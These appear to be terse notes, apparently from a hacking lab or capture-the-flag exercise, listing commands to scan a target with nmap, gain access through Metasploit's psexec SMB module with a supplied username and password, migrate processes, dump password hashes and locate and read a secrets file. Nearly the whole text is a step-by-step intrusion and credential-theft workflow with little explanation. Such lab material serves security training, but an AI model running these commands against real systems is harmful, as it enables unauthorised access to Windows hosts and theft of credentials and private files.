Run
      nmap -sN -Pn -A [target IP] 

      msfconsole 
      search exploit/windows/smb/psexec

      use0


      set SMBPass [password]
      set SMBUser [user]
      run
      
      sysinfo


      migrate 772
      hashdump
      

      search -f secrets.txt
Used to locate files      

      cat "path/to/file" 
